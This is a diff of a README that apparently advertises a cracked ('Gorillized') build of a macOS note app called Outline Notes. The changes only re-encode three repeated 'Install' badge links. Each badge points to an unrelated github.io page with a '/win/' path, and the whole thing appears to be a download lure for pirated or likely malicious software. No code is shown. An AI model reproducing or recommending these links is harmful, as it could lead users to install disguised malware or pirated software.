@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Outline Notes (Gorillized)](https://img.shields.io/badge/⬇_Install_Outline%20Notes%20(Gorillized)-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Outline Notes (Gorillized)](https://img.shields.io/badge/⬇_Install_Outline+Notes+(Gorillized)-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Outline Notes is a macOS note-taking app that supports hierarchical outlining wi
 
 <div align="center">
 
-[![⬇ Install Outline Notes (Gorillized)](https://img.shields.io/badge/⬇_Install_Outline%20Notes%20(Gorillized)-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Outline Notes (Gorillized)](https://img.shields.io/badge/⬇_Install_Outline+Notes+(Gorillized)-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Outline Notes is a macOS note-taking app that supports hierarchical outlining wi
 
 <div align="center">
 
-[![⬇ Install Outline Notes (Gorillized)](https://img.shields.io/badge/⬇_Install_Outline%20Notes%20(Gorillized)-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Outline Notes (Gorillized)](https://img.shields.io/badge/⬇_Install_Outline+Notes+(Gorillized)-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
